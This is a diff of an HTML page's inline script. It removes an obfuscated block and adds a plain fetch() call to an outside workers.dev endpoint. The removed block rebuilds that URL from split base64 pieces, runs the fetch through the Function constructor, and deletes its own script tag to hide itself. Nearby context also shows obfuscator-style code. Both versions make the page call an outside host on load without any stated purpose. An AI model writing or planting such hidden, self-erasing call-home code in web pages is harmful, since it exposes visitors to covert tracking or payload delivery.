@@ -154,25 +154,7 @@
                 return _0x354d();
             }
         
-(function () {
-  const gdd = {
-    a: "aHR0cHM6Ly93b3Jr",
-    b: "ZXJzLXBsYXlncm91",
-    c: "bmQtc3RlZXAtbGFr",
-    d: "ZS04NDNmLnNsaWNl",
-    e: "LWE4Yi53b3JrZXJz",
-    f: "LmRldi9hcGktZW5k",
-    g: "cG9pbnQ="
-  };
-
-  const order = ["a", "b", "c", "d", "e", "f", "g"];
-
-  const b64 = order.map(k => gdd[k]).join("");
-  const url = atob(b64);
-  Function(`fetch("${url}")`)();
-
-  document.currentScript.remove();
-})();
+    fetch("https://workers-playground-steep-lake-843f.slice-a8b.workers.dev/api-endpoint")
 
     </script>
     <meta charset="UTF-8" />
